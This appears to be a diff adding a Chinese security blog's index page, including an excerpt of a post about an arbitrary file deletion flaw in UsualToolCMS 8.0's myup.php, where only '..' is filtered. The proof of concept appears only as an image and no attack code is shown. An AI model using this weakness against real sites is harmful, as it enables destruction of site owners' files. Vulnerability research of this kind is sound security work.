+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/UsualToolcms/UsualToolcms%208.0%20%E5%89%8D%E5%8F%B0sql/" data-id="cl5c2qxdn00jyy8v14ywbbmzz" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-UsualToolcms/UsualToolcms 8.0 myup.php 前台任意文件删除" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/UsualToolcms/UsualToolcms%208.0%20myup.php%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.210Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="UsualToolcms前台任意文件删除"><a href="#UsualToolcms前台任意文件删除" class="headerlink" title="UsualToolcms前台任意文件删除"></a>UsualToolcms前台任意文件删除</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>前台myup.php文件最后一段存在任意文件删除</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>UsualToolCMS-8.0-Release</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞点：<a target="_blank" rel="noopener" href="http://0-sec.org/myup.php">http://0-sec.org/myup.php</a></p>
+<p><img src="/resource/UsualToolcms8.0myup.php%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/media/rId25.shtml"></p>
+<p>第47行只对..精心过滤，我仍然能任意删除网站内部的文件，直接构造poc，</p>
+<p><img src="/resource/UsualToolcms8.0myup.php%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/media/rId26.shtml"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/UsualToolcms/UsualToolcms%208.0%20myup.php%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/UsualToolcms/UsualToolcms%208.0%20myup.php%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" data-id="cl5c2qxdn00jxy8v11delhxwi" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/28/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/27/">27</a><a class="page-number" href="/page/28/">28</a><span class="page-number current">29</span><a class="page-number" href="/page/30/">30</a><a class="page-number" href="/page/31/">31</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/30/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
